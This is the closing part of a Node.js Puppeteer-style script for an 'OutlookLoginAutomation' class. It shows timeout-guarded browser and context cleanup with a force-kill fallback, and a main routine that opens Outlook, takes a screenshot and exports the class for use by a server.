                                    await Promise.race([
                                        page.close(),
                                        new Promise((_, reject) => setTimeout(() => reject(new Error('Individual page timeout')), 1000))
                                    ]);
                                } catch (individualPageError) {
                                    console.log('Individual page close failed');
                                }
                            }
                        }
                    } catch (pagesError) {
                        console.log('Pages cleanup failed, proceeding to force kill');
                    }

                    // Close incognito context first, then browser
                    if (this.context) {
                        try {
                            await Promise.race([
                                this.context.close(),
                                new Promise((_, reject) => setTimeout(() => reject(new Error('Context close timeout')), 2000))
                            ]);
                            console.log('Private browser context closed');
                        } catch (contextError) {
                            console.log('Context close failed, will force kill');
                        }
                    }
                    
                    try {
                        await Promise.race([
                            this.browser.close(),
                            new Promise((_, reject) => setTimeout(() => reject(new Error('Browser close timeout')), 3000))
                        ]);
                        console.log('Browser closed successfully');
                    } catch (browserCloseError) {
                        console.log('Browser close failed, force killing process');
                        
                        // Force kill browser process immediately
                        if (browserProcess && !browserProcess.killed) {
                            try {
                                browserProcess.kill('SIGKILL');
                                console.log('Browser process force-killed with SIGKILL');
                            } catch (killError) {
                                console.error('Error force-killing browser process:', killError.message);
                            }
                        }
                    }
                } else {
                    console.log('Browser connection already closed');
                }
                
                // Always attempt to force kill the process as final cleanup
                if (browserProcess && !browserProcess.killed) {
                    try {
                        browserProcess.kill('SIGKILL');
                        console.log('Browser process force-killed during cleanup');
                    } catch (killError) {
                        console.log('Browser process was already dead');
                    }
                }
                
            } catch (error) {
                console.error('Error during browser close:', error.message);
                
                // Final attempt to kill browser process
                try {
                    const process = this.browser.process();
                    if (process && !process.killed) {
                        process.kill('SIGKILL');
                        console.log('Browser process force-killed in error handler');
                    }
                } catch (killError) {
                    console.log('Final cleanup: Browser process was already terminated');
                }
            }
        }

        // Reset instance variables
        this.browser = null;
        this.page = null;
        this.context = null;
        this.isClosing = false;
        
        console.log('Browser cleanup completed');
    }
}

// Main execution function
async function main() {
    const automation = new OutlookLoginAutomation();

    try {
        console.log('Starting Outlook login automation...');

        // Initialize browser
        await automation.init();

        // Navigate to Outlook
        const navigated = await automation.navigateToOutlook();
        if (!navigated) {
            throw new Error('Failed to navigate to Outlook');
        }

        // Take initial screenshot
        await automation.takeScreenshot('outlook-initial.png');

        console.log('Outlook automation is ready for API requests.');
        console.log('Use the server endpoints to perform login operations.');

    } catch (error) {
        console.error('Automation failed:', error.message);
    } finally {
        await automation.close();
    }
}

// Export the class for use in other modules
module.exports = { OutlookLoginAutomation };

// Run if this file is executed directly
if (require.main === module) {
    main().catch(console.error);
}